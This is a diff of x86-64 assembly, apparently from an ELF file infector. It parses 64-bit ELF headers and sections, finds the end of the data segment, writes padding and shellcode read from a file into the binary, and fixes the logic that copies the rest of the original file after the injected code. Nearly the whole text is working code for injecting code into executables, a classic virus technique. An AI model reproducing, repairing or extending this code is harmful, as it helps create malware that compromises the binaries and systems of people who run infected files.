@@ -441,7 +441,7 @@ parse64elf:
 
 	call parse64elfheader
 	call parse64elfphdr ; will return pad
-	mov rdx, rax; pass pad as 3rd param
+	mov r10, rax; pass pad as 3rd param
 	call parse64elfsec
 retn
 
@@ -482,7 +482,7 @@ parse64elfheader:
 	pop rsi
 	pop rdi
 retn
-%define SHELLCODE_LEN 45
+%define SHELLCODE_LEN 44
 ; unsigned long find_new_entry(void *file)
 ; will return the offset to begining of our shellcode
 find_new_entry:
@@ -728,9 +728,11 @@ retn
 
 ;void parse64elfsec(void *file, int wfd, unsigned long pad)
 parse64elfsec:
+	sub rsp, 8; file copy 
 	sub rsp, 8; offset of "new sect", where we will put pad and shellcode
 	sub rsp, 8;start offset 
-	mov r10, rdx; we're gonna need rdx for syscalls
+	mov r9, rdx; we're gonna need rdx for syscalls, store fsize
+	mov QWORD[rsp+16], rdi; save void * file
 	; find offset where we will put our shellcode
 	call find_end_data_seg ; rax now contains the offset to the beg of pad & shellcode
 	mov [rsp + 8], rax
@@ -768,13 +770,20 @@ parse64elfsec:
 	jmp loop_print_pad
 	loop_print_pad_end:
 	call write_shellcode
+	mov rsi, QWORD[rsp + 16]
+	add rsi, QWORD[rsp + 8];point to offset end of data seg in file
+	mov rdx, r9 ; fsize
+	sub rdx, QWORD[rsp + 8]; fsize - new_sect
+	mov rax, 1
+	syscall;write(wfd, file + new_sect, fsize - new_sect);
+	add rsp, 8
 	add rsp, 8
 	add rsp, 8
 retn
 
 ;void write_shellcode(int wfd)
 write_shellcode:
-
+push rdi
 	sub rsp, SHELLCODE_LEN; buffer to read shellcode in
 	;OPEN SC FILE
 	push rdi
@@ -799,4 +808,5 @@ write_shellcode:
 	mov rdx, SHELLCODE_LEN
 	syscall;write(wfd, buffer, SHELLCODE_LEN)
 	add rsp, SHELLCODE_LEN
+pop rdi
 retn 	
